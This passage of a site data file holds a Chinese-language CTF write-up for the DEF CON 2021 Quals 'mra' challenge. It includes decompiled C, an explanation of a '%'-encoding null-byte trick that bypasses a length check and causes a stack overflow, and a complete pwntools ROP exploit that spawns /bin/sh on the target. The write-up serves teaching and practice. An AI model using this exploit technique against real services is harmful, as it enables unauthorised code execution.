class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__int64 <span class=\"title\">vuln</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> v3;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v4;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> v7;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> count;</span><br><span class=\"line\"></span><br><span class=\"line\">    count = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        v7 = *(_BYTE *)(a2 + count);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !v7 )</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v7 == <span class=\"string\">&#x27;%&#x27;</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            v3 = <span class=\"number\">16</span> * hex_to_dec(*(_BYTE *)(a2 + count + <span class=\"number\">1</span>));</span><br><span class=\"line\">            v7 = v3 | hex_to_dec(*(_BYTE *)(a2 + count + <span class=\"number\">2</span>));</span><br><span class=\"line\">            count += <span class=\"number\">3</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ++count;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        v4 = i;</span><br><span class=\"line\">        *(_BYTE *)(a1 + v4) = v7;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">__int64 <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    __int64 *v1;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 v2[<span class=\"number\">1024</span>];</span><br><span class=\"line\">    <span class=\"keyword\">char</span> v3[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> v4;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int64 lenStrNum;</span><br><span class=\"line\">    __int64 v6;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *v7;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *strNum;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *v9;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *v10;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v11;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *v12;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *v13;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> __int8 *token_;</span><br><span class=\"line\"></span><br><span class=\"line\">    sub_401018((__int64)&amp;unk_41D0F0, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    sub_401018((__int64)&amp;unk_41D000, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    v13 = <span class=\"string\">&quot;GET /api/isodd/&quot;</span>;</span><br><span class=\"line\">    v12 = <span class=\"string\">&quot;Buy isOddCoin, the hottest new cryptocurrency!&quot;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(v3, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v3));</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>((<span class=\"keyword\">int8x16_t</span> *)v2, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v2));</span><br><span class=\"line\">    token_ = <span class=\"string\">&quot;public&quot;</span>;</span><br><span class=\"line\">    v11 = read(<span class=\"number\">0</span>, v2, <span class=\"number\">0x3FF</span>); <span class=\"comment\">// 沒有 null terminate 的問題</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v11 &lt;= <span class=\"number\">8</span> || <span class=\"built_in\">strncmp</span>(v2, v13, <span class=\"number\">15</span>) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    v10 = <span class=\"built_in\">strchr</span>(v2, <span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v10 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        *v10-- = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( *v10 == <span class=\"string\">&#x27;\\r&#x27;</span> )</span><br><span class=\"line\">            *v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v10 = strtok(v2, <span class=\"string\">&quot; HTTP/&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v10 )</span><br><span class=\"line\">        *v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v9 = <span class=\"built_in\">strchr</span>(v2, <span class=\"string\">&#x27;?&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v9 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        *v9++ = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strncmp</span>(v9, <span class=\"string\">&quot;token=&quot;</span>, <span class=\"number\">6</span>) )</span><br><span class=\"line\">            token_ = v9 + <span class=\"number\">6</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    strNum = &amp;v2[<span class=\"number\">15</span>];</span><br><span class=\"line\">    v7 = <span class=\"built_in\">strchr</span>(&amp;v2[<span class=\"number\">15</span>], <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v7 )</span><br><span class=\"line\">        *v7 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    lenStrNum = <span class=\"built_in\">strlen</span>(strNum);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(token_, <span class=\"string\">&quot;enterprise&quot;</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( lenStrNum &gt; <span class=\"number\">0xC</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            response(<span class=\"number\">401</span>, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;error\\&quot;: \\&quot;contact us for unlimited large number support\\&quot;\\n&#125;&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(token_, <span class=\"string\">&quot;premium&quot;</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( lenStrNum &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            response(<span class=\"number\">401</span>, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;error\\&quot;: \\&quot;sign up for enterprise to get large number support\\&quot;\\n&#125;&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        token_ = <span class=\"string\">&quot;public&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( lenStrNum &gt; <span class=\"number\">6</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            response(<span class=\"number\">401</span>, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;error\\&quot;: \\&quot;sign up for premium or enterprise to get large number support\\&quot;\\n&#125;&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    lenStrNum = (<span class=\"keyword\">int</span>)vuln((__int64)v3, (__int64)strNum);<span class=\"comment\">// 漏洞函數，v3 也在 stack 上</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;-&#x27;</span> &amp;&amp; !<span class=\"built_in\">strcmp</span>(token_, <span class=\"string\">&quot;public&quot;</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        response(<span class=\"number\">401</span>, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;error\\&quot;: \\&quot;sign up for premium or enterprise to get negative number support\\&quot;\\n&#125;&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        v4 = (<span class=\"keyword\">unsigned</span> __int8)v3[lenStrNum - <span class=\"number\">1</span>] - <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">        v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(token_, <span class=\"string\">&quot;public&quot;</span>) )</span><br><span class=\"line\">            asprintf(&amp;v1, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;isodd\\&quot;: %s,\\n\\t\\&quot;ad\\&quot;: \\&quot;%s\\&quot;\\n&#125;\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            asprintf(&amp;v1, <span class=\"string\">&quot;&#123;\\n\\t\\&quot;isodd\\&quot;: %s\\n&#125;\\n&quot;</span>);</span><br><span class=\"line\">        response(<span class=\"number\">200</span>, v1);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>仔細分析完上面的程式碼可以知道這整份 code 大部分的工作都在進行 http request 的 parsing，而這份程式接受的 http request 格式大約如下，其中 <code>[strNum]</code> 以及 <code>[token]</code> 替換成上面 c code 中對應的變數。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /api/isodd/[strNum]/?token=[token] HTTP/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"漏洞函數\"><a href=\"#漏洞函數\" class=\"headerlink\" title=\"漏洞函數\"></a>漏洞函數</h2><p>漏洞函數在上面 c code 中的 <code>vuln</code> 中，但是在進入 <code>vuln</code> 之前，中間會驗證 <code>lenStrNum</code> ，而長度最大只能為 0xc。如此一來便很難造成 overflow。( v3 在 stack 上 )</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lenStrNum = <span class=\"built_in\">strlen</span>(strNum);</span><br><span class=\"line\">...</span><br><span class=\"line\">lenStrNum = (<span class=\"keyword\">int</span>)vuln((__int64)v3, (__int64)strNum);</span><br></pre></td></tr></table></figure>\n\n<p>接下來看到 <code>vuln</code> 內部，可以看到這個函數主要負責進行類似 <code>strcpy</code> 的行為，一樣也是以 <code>\\x00</code> 為中止點，且多了一個功能。當目前正在 copy 的字元為 <code>%</code> 時，會將後面的兩個字元視為 hex string 轉成一個 byte 並存起來。例如 <code>&quot;%0a&quot;</code>會被轉成 <code>&#39;\\n&#39;</code> ，並當成一個 byte 存取來。我們也可以利用這樣的特性來製作使得 <code>x00</code> 被跳過。<strong>例如 <code>&quot;%\\x001aaaaaaaaaa&quot;</code> 這個字串的雖然有  null terminator，但在這裡由於前面有 <code>%</code> 的緣故，會直接跳過，而且對於 <code>strlen</code> 來說這個字串長度只有 1 ，但實際上有 13 bytes，一來便可以順便繞過對於 <code>strNum</code> 的長度限制。</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v7 == <span class=\"string\">&#x27;%&#x27;</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    v3 = <span class=\"number\">16</span> * hex_to_dec(*(_BYTE *)(a2 + count + <span class=\"number\">1</span>));</span><br><span class=\"line\">    v7 = v3 | hex_to_dec(*(_BYTE *)(a2 + count + <span class=\"number\">2</span>));</span><br><span class=\"line\">    count += <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>利用上面提到的方法，我們便可以進行 buffer overflow，但這裡有個有趣的現象，可以看出來這份程式有被特殊處理過。</p>\n<p>以下分別為 main 的 prologue 跟 epilogue，其中可以看到在進行創造 stack frame 的時候，居然不是以高地址為 stack bottom ，然後往低地址增長，而是以低地址為 stack bottom ，然後往高地址增長。</p>\n<p>其中很明顯地看到人為的處理。例如說:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sub sp, sp, #0x490</span><br><span class=\"line\">被換成</span><br><span class=\"line\">add sp, sp, #0x490</span><br><span class=\"line\">sub sp, sp, #0x490</span><br><span class=\"line\"></span><br><span class=\"line\">然後</span><br><span class=\"line\">stp x29, x30, [sp,#0]</span><br><span class=\"line\">被換成</span><br><span class=\"line\">stp x29, x30, [sp,#0]</span><br><span class=\"line\">add sp, sp, #0x490</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/Z8LVbx5.png\"></p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/3QdQD5F.png\"></p>\n<p>那麼這樣我們的 buffer overflow 的構造 ROP 的方式就會跟以往不太一樣。以下為 layout。</p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/T0myzaL.png\"></p>\n<p>我們的目標就是覆蓋到 vuln’s stack frame 上的 <code>x30</code> 藉此控制到 return 後的流程。</p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/1v2Ebom.png\" alt=\"img\"></p>\n<h2 id=\"尋找-gadget\"><a href=\"#尋找-gadget\" class=\"headerlink\" title=\"尋找 gadget\"></a>尋找 gadget</h2><p>利用 IDA 的 <strong>find text</strong> 搭配 regular express 搜尋 <code>svc *0</code> 便可以搜尋到很多執行 system call 的 gadget，</p>\n<p>而這裡我挑的是這段:</p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/iSM4UfH.png\"></p>\n<h2 id=\"exploit\"><a href=\"#exploit\" class=\"headerlink\" title=\"exploit\"></a>exploit</h2><p>將上面得到的資訊整理再一起，我們可以得到以下 exploit:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.clear()</span><br><span class=\"line\">context.update(arch=<span class=\"string\">&quot;aarch64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">local = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode</span>(<span class=\"params\">s</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.replace(<span class=\"string\">b&#x27;\\x00&#x27;</span>, <span class=\"string\">b&#x27;%\\x00\\x00&#x27;</span>)</span><br><span class=\"line\">p = <span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = gdb.debug(<span class=\"string\">&quot;./mra&quot;</span>, gdbscript = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        b *0x400338</span></span><br><span class=\"line\"><span class=\"string\">        b *0x4005d4</span></span><br><span class=\"line\"><span class=\"string\">        b *0x4002C0</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    )</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;172.17.0.2&quot;</span>, <span class=\"number\">8000</span>)</span><br><span class=\"line\">rop_chain = flat([</span><br><span class=\"line\">    <span class=\"comment\"># execve(0x41d000, 0, 0)</span></span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x4</span></span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x3</span></span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x2</span></span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x1</span></span><br><span class=\"line\">    <span class=\"number\">0x41D000</span>,   <span class=\"comment\"># x0</span></span><br><span class=\"line\">    <span class=\"number\">221</span>, <span class=\"comment\"># x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># read(0, 0x41d000,64)</span></span><br><span class=\"line\">    <span class=\"number\">0</span>,   <span class=\"comment\"># x4</span></span><br><span class=\"line\">    <span class=\"number\">0</span>,   <span class=\"comment\"># x3</span></span><br><span class=\"line\">    <span class=\"number\">0x10</span>, <span class=\"comment\"># x2</span></span><br><span class=\"line\">    <span class=\"number\">0x41D000</span>, <span class=\"comment\"># x1</span></span><br><span class=\"line\">    <span class=\"number\">0</span>,   <span class=\"comment\"># x0</span></span><br><span class=\"line\">    <span class=\"number\">63</span>, <span class=\"comment\"># x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">])</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007EC                 LDUR            X8, [SP,#-0x30+arg_28]</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007F0                 LDUR            X0, [SP,#-0x30+arg_20]</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007F4                 LDUR            X1, [SP,#-0x30+arg_18]</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007F8                 LDUR            X2, [SP,#-0x30+arg_10]</span></span><br><span class=\"line\"><span class=\"string\">.text:00000000004007FC                 LDUR            X3, [SP,#-0x30+arg_8]</span></span><br><span class=\"line\"><span class=\"string\">.text:0000000000400800                 LDUR            X4, [SP,#-0x30+arg_0]</span></span><br><span class=\"line\"><span class=\"string\">.text:0000000000400804                 SVC             0</span></span><br><span class=\"line\"><span class=\"string\">.text:0000000000400808                 SUB             SP, SP, #0x30 ; &#x27;0&#x27;</span></span><br><span class=\"line\"><span class=\"string\">.text:000000000040080C                 RET</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">trigger = flat([</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"comment\"># x29</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"number\">0x4007EC</span></span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">p.send((<span class=\"string\">b&quot;GET /api/isodd/%\\x001&quot;</span> + encode(<span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x68</span> - <span class=\"built_in\">len</span>(rop_chain)  - <span class=\"number\">1</span>) + rop_chain + trigger)).ljust(<span class=\"number\">0x3ff</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"Resource\"><a href=\"#Resource\" class=\"headerlink\" title=\"Resource\"></a>Resource</h1><p><a href=\"https://github.com/torvalds/linux/blob/v4.17/include/uapi/asm-generic/unistd.h\">Arm syscall number table</a></p>\n<p><a href=\"https://modexp.wordpress.com/2018/10/30/arm64-assembly/\">A Guide to ARM64 / AArch64 Assembly on Linux with Shecodes and Cryptography</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"mra\"><a href=\"#mra\" class=\"headerlink\" title=\"mra\"></a>mra</h1><p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/49iqumD.png\"></p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/FuvJDpX.png\" alt=\"img\"></p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/3gGqHMC.png\" alt=\"img\"></p>\n<h2 id=\"環境設置\"><a href=\"#環境設置\" class=\"headerlink\" title=\"環境設置\"></a>環境設置</h2><p>由於本題為 aarch64 架構，要測試程式的話必須安裝 <strong>qemu-aarch64</strong>。</p>\n<p>安裝完以後執行 <code>qemu-aarch64  -g 2000 mra </code> 便可以使用 <strong>gdb-multiarch</strong> 執行 <code>target remote localhost:2000</code> 進行 remote debugging。</p>\n<p>若要邊撰寫腳本邊 debug 的話，pwntools 對於跨平台的 debug 有相當好得支援，設定好 <code>context</code> 之後，就可以直接用，<code>gdb.debug</code> 開始測試。其背後是使用 <strong>qemu-user</strong> 提供的 debug mode。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.clear()</span><br><span class=\"line\">context.update(arch=<span class=\"string\">&quot;aarch64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = gdb.debug(<span class=\"string\">&quot;./mra&quot;</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h2><p>經過一些簡單的動靜態分析，還有 <strong>qemu-user</strong> 提供的 strace 功能，大致可得到下列這份 code</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span 